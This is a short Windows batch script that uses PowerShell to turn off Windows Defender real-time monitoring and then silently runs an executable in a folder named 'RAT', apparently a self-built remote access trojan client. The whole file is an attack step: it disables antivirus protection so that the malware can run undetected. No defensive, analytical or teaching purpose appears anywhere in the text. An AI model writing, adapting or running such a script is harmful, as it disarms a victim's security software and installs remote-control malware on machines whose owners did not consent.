@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
start /wait D:\Projects\own\RAT\Client-built.exe /S